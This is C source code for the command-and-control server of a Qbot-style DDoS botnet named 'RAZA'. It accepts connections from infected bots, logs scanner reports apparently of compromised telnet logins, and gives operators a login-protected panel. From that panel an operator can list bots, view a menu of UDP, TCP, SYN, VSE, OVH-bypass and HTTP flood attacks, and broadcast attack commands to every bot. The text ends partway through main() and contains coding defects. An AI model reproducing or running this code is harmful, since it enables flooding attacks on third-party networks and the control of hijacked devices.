//RAZA Qbot made by Edo
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>
#define MAXFDS 1000000
//RAZA cnc                                                                                                                                                                                                                                                                                                                                                                                                                                         Made By Edo
struct login_info {
	char username[100];
	char password[100];
};
static struct login_info accounts[100];
struct clientdata_t {
        uint32_t ip;
        char connected;
} clients[MAXFDS];
struct telnetdata_t {
    int connected;
} managements[MAXFDS];
struct args {
    int sock;
    struct sockaddr_in cli_addr;
};
static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile FILE *ticket;
static volatile FILE *staff;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int OperatorsConnected = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;

int fdgets(unsigned char *buffer, int bufferSize, int fd) {
	int total = 0, got = 1;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got;
}
void trim(char *str) {
	int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd) {
	int flags, s;
	flags = fcntl (sfd, F_GETFL, 0);
	if (flags == -1) {
		perror ("fcntl");
		return -1;
	}
	flags |= O_NONBLOCK;
	s = fcntl (sfd, F_SETFL, flags);
    if (s == -1) {
		perror ("fcntl");
		return -1;
	}
	return 0;
}
static int create_and_bind (char *port) {
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;
	memset (&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0) {
		fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
		return -1;
	}
	for (rp = result; rp != NULL; rp = rp->ai_next) {
		sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) continue;
		int yes = 1;
		if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
		s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0) {
			break;
		}
		close (sfd);
	}
	if (rp == NULL) {
		fprintf (stderr, "Could not bind\n");
		return -1;
	}
	freeaddrinfo (result);
	return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected)) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[1;31m", 9, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
void *BotEventLoop(void *useless) {
	struct epoll_event event;
	struct epoll_event *events;
	int s;
    events = calloc (MAXFDS, sizeof event);
    while (1) {
		int n, i;
		n = epoll_wait (epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++) {
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) {
				clients[events[i].data.fd].connected = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd) {
               while (1) {
				struct sockaddr in_addr;
                socklen_t in_len;
                int infd, ipIndex;

                in_len = sizeof in_addr;
                infd = accept (listenFD, &in_addr, &in_len);
				if (infd == -1) {
					if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                    else {
						perror ("accept");
						break;
						 }
				}

				clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
				int dup = 0;
				for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) {
					if(!clients[ipIndex].connected || ipIndex == infd) continue;
					if(clients[ipIndex].ip == clients[infd].ip) {
						dup = 1;
						break;
					}}
				if(dup) {
					if(send(infd, "!* BOTKILL\n", 0, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                    close(infd);
                    continue;
				}
				s = make_socket_non_blocking (infd);
				if (s == -1) { close(infd); break; }
				event.data.fd = infd;
				event.events = EPOLLIN | EPOLLET;
				s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
				if (s == -1) {
					perror ("epoll_ctl");
					close(infd);
					break;
				}
				clients[infd].connected = 1;
			}
			continue;
		}
		else {
			int datafd = events[i].data.fd;
			struct clientdata_t *client = &(clients[datafd]);
			int done = 0;
            client->connected = 1;
			while (1) {
				ssize_t count;
				char buf[2048];
				memset(buf, 0, sizeof buf);
				while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) {
					if(strstr(buf, "\n") == NULL) { done = 1; break; }
					trim(buf);
					if(strcmp(buf, "PING") == 0) {
						if(send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }
						continue;
					}
					if(strstr(buf, "REPORT ") == buf) {
						char *line = strstr(buf, "REPORT ") + 7;
						fprintf(telFD, "%s\n", line);
						fflush(telFD);
						TELFound++;
						continue;
					}
					if(strstr(buf, "PROBING") == buf) {
						char *line = strstr(buf, "PROBING");
						scannerreport = 1;
						continue;
					}
					if(strstr(buf, "REMOVING PROBE") == buf) {
						char *line = strstr(buf, "REMOVING PROBE");
						scannerreport = 0;
						continue;
					}
					if(strcmp(buf, "PONG") == 0) {
						continue;
					}
					printf("buf: \"%s\"\n", buf);
				}
				if (count == -1) {
					if (errno != EAGAIN) {
						done = 1;
					}
					break;
				}
				else if (count == 0) {
					done = 1;
					break;
				}
			if (done) {
				client->connected = 0;
				close(datafd);
					}
				}
			}
		}
	}
}
unsigned int BotsConnected() {
	int i = 0, total = 0;
	for(i = 0; i < MAXFDS; i++) {
		if(!clients[i].connected) continue;
		total++;
	}
	return total;
}
int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("Login.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
    if(find_result == 0)return 0;
    return find_line;
}

void *BotWorker(void *sock) {
	int datafd = (int)sock;
	int find_line;
	OperatorsConnected++;
    pthread_t title;
    char buf[2048];
	char* username;
	char* password;
	memset(buf, 0, sizeof buf);
	char botnet[2048];
	memset(botnet, 0, 2048);
	char botcount [2048];
	memset(botcount, 0, 2048);
	char statuscount [2048];
	memset(statuscount, 0, 2048);

	FILE *fp;
	int i=0;
	int c;
	fp=fopen("Login.txt", "r");
	while(!feof(fp)) {
		c=fgetc(fp);
		++i;
	}
    int j=0;
    rewind(fp);
    while(j!=i-1) {
		fscanf(fp, "%s %s", accounts[j].username, accounts[j].password);
		++j;
	}	
	
		char clearscreen [2048];
		memset(clearscreen, 0, 2048);
		sprintf(clearscreen, "\033[1A");
		char user [5000];	
		
        sprintf(user, "\e[38;5;36mUsername:\e[0m\e[30m: ");
		
		if(send(datafd, user, strlen(user), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
        trim(buf);
		char* nickstring;
		sprintf(accounts[find_line].username, buf);
        nickstring = ("%s", buf);
        find_line = Find_Login(nickstring);
        if(strcmp(nickstring, accounts[find_line].username) == 0){
		char password [5000];
		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
        sprintf(password, "\e[38;5;36mPassword:\e[0m\e[30m: ", accounts[find_line].username);
		if(send(datafd, password, strlen(password), MSG_NOSIGNAL) == -1) goto end;
		
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;

        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
		
        goto Banner;
        }
void *TitleWriter(void *sock) {
	int datafd = (int)sock;
    char string[2048];
    while(1) {
		memset(string, 0, 2048);
        sprintf(string, "%c]0; %d PWLE IN MATA | RAZA BOTNET 2020  %c", '\033', BotsConnected(), '\007');
        if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
		sleep(2);
		}
}		
        failed:
		if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        goto end;

		Banner:
		pthread_create(&title, NULL, &TitleWriter, sock);
		char ascii_banner_line0   [5000];
		char ascii_banner_line1   [5000];
        char ascii_banner_line2   [5000];
        char ascii_banner_line3   [5000];
        char ascii_banner_line4   [5000];
        char ascii_banner_line5   [5000];
        char ascii_banner_line6   [5000];
        char ascii_banner_line7   [5000];
        char ascii_banner_line8   [5000];
        char ascii_banner_line9   [5000];

  sprintf(ascii_banner_line4,  "\e[38;5;36m                  ╔══════════════════════════════════════════╗  \e[38;5;36m\r\n");
  sprintf(ascii_banner_line5,  "\e[38;5;36m                ╔═╝                                          ╚═╗\e[38;5;36m\r\n");
  sprintf(ascii_banner_line6,  "\e[38;5;36m                ║        \e[0mSAY \e[38;5;36mHELP \e[0mCOMAND LIST\e[38;5;36m                  ║\e[38;5;36m\r\n");
  sprintf(ascii_banner_line7,  "\e[38;5;36m                ╚═╗        youtube.com/RAZzAhacked           ╔═╝\e[38;5;36m\r\n");
  sprintf(ascii_banner_line8,  "\e[38;5;36m                  ╚══════════════════════════════════════════╝  \e[38;5;36m\r\n");

  if(send(datafd, ascii_banner_line0, strlen(ascii_banner_line0), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
		while(1) {
		char input [5000];
        sprintf(input, "\e[38;5;36mRAZA#");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &TitleWriter, sock);
        managements[datafd].connected = 1;

		while(fdgets(buf, sizeof buf, datafd) > 0) {   
			if(strstr(buf, "count") || strstr(buf, "Count") || strstr(buf, "COUNT") || strstr(buf, "bots") || strstr(buf, "BOTS")) {
				char botcount [2048];
				memset(botcount, 0, 2048);
				char statuscount [2048];
				char ops [2048];
				memset(statuscount, 0, 2048);
				sprintf(botcount,    "\e[36mBots\e[38;5;36m:\e[36m  [\e[0m%d\e[36m]\r\n", BotsConnected(), OperatorsConnected);		
				sprintf(ops,         "\e[36mUsers\e[38;5;36m:\e[36m [\e[0m%d\e[36m]\r\n", OperatorsConnected, scannerreport);
				sprintf(statuscount, "\e[36mDups\e[38;5;36m:\e[36m  [\e[0m%d\e[36m]\r\n", TELFound, scannerreport);
				if(send(datafd, botcount, strlen(botcount), MSG_NOSIGNAL) == -1) return;
				if(send(datafd, ops, strlen(ops), MSG_NOSIGNAL) == -1) return;
				if(send(datafd, statuscount, strlen(statuscount), MSG_NOSIGNAL) == -1) return;
		char input [5000];
        sprintf(input, "\e[38;5;36mRAZA#");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}

			if(strstr(buf, "credit") || strstr(buf, "Owner") || strstr(buf, "CREDIT") || strstr(buf, "edo") || strstr(buf, "yqro") || strstr(buf, "PORTS")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char s2  [800];
				char s3  [800];
				char s4  [800];
				char s5  [800];
				char s6  [800];
         
                sprintf(s2,  "\e[38;5;36m    ╔══════════════════════════════════════════╗ \r\n");
                sprintf(s3,  "\e[38;5;36m  ╔═╝                                                  ╚═╗\r\n");         
                sprintf(s4,  "\e[38;5;36m  ║   \e[36mRAZA BOTNET SOURCE 2020 POWERFULL ATTACK UPDATE       \e[38;5;36m║\r\n");
                sprintf(s5,  "\e[38;5;36m  ╚═╗                                                  ╔═╝\r\n");
                sprintf(s6,  "\e[38;5;36m    ╚══════════════════════════════════════════╝ \r\n");         
 
				if(send(datafd, s2,  strlen(s2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s3,  strlen(s3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s4,  strlen(s4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s5,  strlen(s5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s6,  strlen(s6),	MSG_NOSIGNAL) == -1) goto end;
				
				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[38;5;36mRAZA#");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
			if(strstr(buf, "help") || strstr(buf, "HELP") || strstr(buf, "Help") || strstr(buf, "commands") || strstr(buf, "command") || strstr(buf, "COMMAND")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char hp2  [800];
				char hp3  [800];
				char hp4  [800];
				char hp5  [800];
				char hp6  [800];
				char hp7  [800];
				char hp8  [800];

				sprintf(hp2, "\e[38;5;36m  ╔═══════════════════════════════════════╗           \r\n");
				sprintf(hp3, "\e[38;5;36m╔═╝ \e[36mmethods Shows Attack Commands\e[38;5;36m         ╚═╗         \r\n");
				sprintf(hp4, "\e[38;5;36m║   \e[36mrules   Shows Botnet Rules To Follow\e[38;5;36m    ║         \r\n");
				sprintf(hp5, "\e[38;5;36m║   \e[36mbots    Shows Count Of Bots/Users/Dups\e[38;5;36m  ║         \r\n");
				sprintf(hp6, "\e[38;5;36m║   \e[36mclear   Clears Screen, Back To Banner\e[38;5;36m   ║         \r\n");
				sprintf(hp6, "\e[38;5;36m║   \e[36mcreadite   SHOWS WHO MADE THIS SHIT\e[38;5;36m       ║         \r\n");
				sprintf(hp7, "\e[38;5;36m╚═╗ \e[36mLOGOUT  Closes Out Putty Session\e[38;5;36m      ╔═╝         \r\n");
				sprintf(hp8, "\e[38;5;36m  ╚═══════════════════════════════════════╝           \r\n");

				if(send(datafd, hp2,  strlen(hp2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp3,  strlen(hp3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp4,  strlen(hp4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp5,  strlen(hp5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp6,  strlen(hp6), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp7,  strlen(hp7), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp8,  strlen(hp8), MSG_NOSIGNAL) == -1) goto end;

				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[38;5;36mRAZA#");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
			if(strstr(buf, "rule") || strstr(buf, "RULE") || strstr(buf, "RULE") || strstr(buf, "rules") || strstr(buf, "RULES") || strstr(buf, "Rules")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char p2  [800];
				char p3  [800];
				char p4  [800];
				char p5  [800];
				char p6  [800];
				char p7  [800];
				char p8  [800];

				sprintf(p2,  "\e[38;5;36m  ╔════════════════════════════════════╗       \r\n");
				sprintf(p3,  "\e[38;5;36m╔═╝ \e[36mRULE 1 NO SHARING NET IP\e[38;5;36m           ╚═╗     \r\n");
				sprintf(p4,  "\e[38;5;36m║   \e[36mRULE 2 NO SPAMMING ATTACKS\e[38;5;36m           ║     \r\n");
				sprintf(p5,  "\e[38;5;36m║   \e[36mRULE 3 NO SHARING NET LOGIN INFO\e[38;5;36m     ║     \r\n");
				sprintf(p6,  "\e[38;5;36m║   \e[36mRULE 4 NO HITTING GOVERMENT SITES\e[38;5;36m    ║     \r\n"); 
				sprintf(p7,  "\e[38;5;36m╚═╗ \e[36mRULE 5 NO ATTACKS LONGER THAN 800\e[38;5;36m  ╔═╝     \r\n");                       
				sprintf(p8,  "\e[38;5;36m  ╚════════════════════════════════════╝       \r\n");
			
				if(send(datafd, p2,  strlen(p2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, p3,  strlen(p3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, p4,  strlen(p4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, p5,  strlen(p5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, p6,  strlen(p6), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, p7,  strlen(p7), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, p8,  strlen(p8), MSG_NOSIGNAL) == -1) goto end;

		pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[38;5;36mRAZA#");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
			if(strstr(buf, "TICKET") || strstr(buf, "Ticket") || strstr(buf, "ticket")) {
				char r2  [800];

				sprintf(r2,  "\e[0m !* OPEN (NAME) (QUESTION) \e[0m\r\n");

				if(send(datafd, r2,  strlen(r2), MSG_NOSIGNAL) == -1) goto end;
                pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[0mRAZA#");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
			if(strstr(buf, "!* OPEN") || strstr(buf, "!* Open") || strstr(buf, "!* open")) {
                FILE *TicketOpen;
                TicketOpen = fopen("Ticket_Open.txt", "a");
			    time_t now;
			    struct tm *gmt;
			    char formatted_gmt [50];
			    char lcltime[50];
			    now = time(NULL);
			    gmt = gmtime(&now);
			    strftime ( formatted_gmt, sizeof(formatted_gmt), "%I:%M %p", gmt );
                fprintf(TicketOpen, "Support Ticket Open - [%s] %s\n", formatted_gmt, buf);
                fclose(TicketOpen);
                char ry1  [800];
                sprintf(ry1,  "\e[0m (Ticket Has Been Open)\r\n");              
				if(send(datafd, ry1,  strlen(ry1),	MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[38;5;36mRAZA#");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
				if(strstr(buf, "attack") || strstr(buf, "?") || strstr(buf, "methods")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char lsg  [800];
				char lsh  [800];
				char ls2  [800];
				char ls3  [800];
				char ls4  [800];
				char lsi  [800];
				char lsf  [800];
				char ls5  [800];
				char lsc  [800];
				char lsd  [800];
				char lsj  [800];
				char lsk  [800];
				char ls6  [800];
				char ls7  [800];
				char ls8  [800];
				char lse  [800];
				char ls9  [800];
				char lsb  [800];
				




				sprintf(lsg,  "\e[38;5;36m                     ╔═════� ══� � � ══════════════╗                                \r\n");
				sprintf(lsh,  "\e[38;5;36m                     ║  METHODS RAZA BOTNET 2020  ║                                \r\n");
				sprintf(ls2,  "\e[38;5;36m  ╔══════════════════╩════════════════╩═══════════════════╗            \r\n");
				sprintf(ls3,  "\e[38;5;36m╔═╝ \e[36m!* STD [IP] [PORT] [TIME] - (STD FLOOD )\e[38;5;36m              ╚═╗          \r\n");
				sprintf(ls4,  "\e[38;5;36m║   \e[36m!* UDPREG [IP] [PORT] [TIME] 32 0 10 - (UDP FLOOD)\e[38;5;36m      ║          \r\n");
				sprintf(lsi,  "\e[38;5;36m║   \e[36m!* UDPRAW [IP] [PORT] [TIME] 32 0 10 - (RAW UDP FLOOD)\e[38;5;36m  ║          \r\n");
				sprintf(lsf,  "\e[38;5;36m║   \e[36m!* UDPHEX [IP] [PORT] [TIME] 32 0 10 - (UDPHEX)\e[38;5;36m         ║          \r\n");
				sprintf(ls5,  "\e[38;5;36m║   \e[36m!* TCP [IP] [PORT] [TIME] 32 all 0 10 - (TCP FLOOD)\e[38;5;36m     ║          \r\n");
				sprintf(lsc,  "\e[38;5;36m║   \e[36m!* ACK [IP] [PORT] [TIME] 32 all 0 10 - (ACK FLOOD)\e[38;5;36m     ║          \r\n");
				sprintf(lsd,  "\e[38;5;36m║   \e[36m!* XMAS [IP] [PORT] [TIME] 32 all 0 10 - (XMAS)\e[38;5;36m         ║          \r\n");
				sprintf(lsj,  "\e[38;5;36m║   \e[36m!* SYN [IP] [PORT] [TIME] 32 all 0 10 - (SYN FLOOD)\e[38;5;36m     ║          \r\n");
				sprintf(lsk,  "\e[38;5;36m║   \e[36m!* STOMP [IP] [PORT] [TIME] 32 all 0 10 - (TCP STOMP)\e[38;5;36m   ║          \r\n");
				sprintf(ls6,  "\e[38;5;36m║   \e[36m!* VSE [IP] [PORT] [TIME] 32 1024 10 - (VSE FLOOD)\e[38;5;36m      ║          \r\n");
				sprintf(ls7,  "\e[38;5;36m║   \e[36m!* OVH [IP] [PORT] [TIME] - (OVH BYPASS)\e[38;5;36m                ║          \r\n");
				sprintf(ls8,  "\e[38;5;36m║   \e[36m!* HTTPSTOMP [IP] [PORT] [TIME] 1024 - (HTTP STOMP\e[38;5;36m      ║          \r\n");
				sprintf(lse,  "\e[38;5;36m║   \e[36m!* HTTP [IP] [PORT] [TIME] 1024 - (HTTP Flood\e[38;5;36m           ║          \r\n");
				sprintf(ls9,  "\e[38;5;36m╚═╗ \e[36m!* STOP - (STOPS ALL ATTACKS)\e[38;5;36m                         ╔═╝          \r\n");
				sprintf(lsb,  "\e[38;5;36m  ╚═══════════════════════════════════════════════════════╝            \r\n");

				if(send(datafd, lsg,  strlen(lsg),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lsh,  strlen(lsh),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls2,  strlen(ls2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls3,  strlen(ls3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls4,  strlen(ls4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lsi,  strlen(lsi),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lsf,  strlen(lsf),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls5,  strlen(ls5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lsc,  strlen(lsc),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lsd,  strlen(lsd),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lsj,  strlen(lsj),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lsk,  strlen(lsk),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls6,  strlen(ls6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls7,  strlen(ls7),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls8,  strlen(ls8),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lse,  strlen(lse),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls9,  strlen(ls9),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lsb,  strlen(lsb),	MSG_NOSIGNAL) == -1) goto end;



				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[38;5;36mRAZA#");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}
			if(strstr(buf, "!* STOP") || strstr(buf, "!* Stop") || strstr(buf, "!* stop"))
			{
				char killattack [2048];
				memset(killattack, 0, 2048);
				char killattack_msg [2048];
				
				sprintf(killattack, "\e[0m Stopping Attacks...\r\n");
				broadcast(killattack, datafd, "output.");
				if(send(datafd, killattack, strlen(killattack), MSG_NOSIGNAL) == -1) goto end;
				while(1) {
		char input [5000];
        sprintf(input, "\e[38;5;36mRAZA#");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}


			if(strstr(buf, "CLEAR") || strstr(buf, "clear") || strstr(buf, "Clear") || strstr(buf, "cls") || strstr(buf, "CLS") || strstr(buf, "Cls")) {
				char clearscreen [2048];
				memset(clearscreen, 0, 2048);
				sprintf(clearscreen, "\033[2J\033[1;1H");
				if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line0, strlen(ascii_banner_line0), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;


				while(1) {
		char input [5000];
        sprintf(input, "\e[38;5;36mRAZA#");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, "logout") || strstr(buf, "LOGOUT") || strstr(buf, "Logout") || strstr(buf, "ext") || strstr(buf, "EXIT") || strstr(buf, "exit")) {
				char logoutmessage [2048];
				memset(logoutmessage, 0, 2048);
				sprintf(logoutmessage, "\e[0m Logging out...", accounts[find_line].username);
				if(send(datafd, logoutmessage, strlen(logoutmessage), MSG_NOSIGNAL) == -1)goto end;
				sleep(2);
				goto end;
			}

            trim(buf);
		char input [5000];
        sprintf(input, "\e[38;5;36mRAZA#");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
            if(strlen(buf) == 0) continue;
            printf("%s: \"%s\"\n",accounts[find_line].username, buf);

			FILE *LogFile;
            LogFile = fopen("server_history.log", "a");
			time_t now;
			struct tm *gmt;
			char formatted_gmt [50];
			char lcltime[50];
			now = time(NULL);
			gmt = gmtime(&now);
			strftime ( formatted_gmt, sizeof(formatted_gmt), "%I:%M %p", gmt );
            fprintf(LogFile, "[%s]: %s\n", formatted_gmt, buf);
            fclose(LogFile);
            broadcast(buf, datafd, accounts[find_line].username);
            memset(buf, 0, 2048);
        }

		end:
		managements[datafd].connected = 0;
		close(datafd);
		OperatorsConnected--;
}
/*STARCODE*/
void *BotListener(int port) {
	int sockfd, newsockfd;
	socklen_t clilen;
    struct sockaddr_in serv_addr, cli_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) perror("ERROR opening socket");
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(port);
    if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
    listen(sockfd,5);
    clilen = sizeof(cli_addr);
    while(1) {
		newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");
        pthread_t thread;
        pthread_create( &thread, NULL, &BotWorker, (void *)newsockfd);
}}
int main (int argc, char *argv[], void *sock) {
        signal(SIGPIPE, SIG_IGN);
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4) {
			fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
			exit (EXIT_FAILURE);
        }

		port = atoi(argv[3]);
		printf("\e[38;5;36m[+] Welcome To RAZA Made By Edo and Yqro [+]\n");
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN);
        if (s == -1) {
			perror ("listen");
			abort ();
        }
        epollFD = epoll_create1 (0);
        if (epollFD == -1) {
			perror ("epoll_create");
			abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
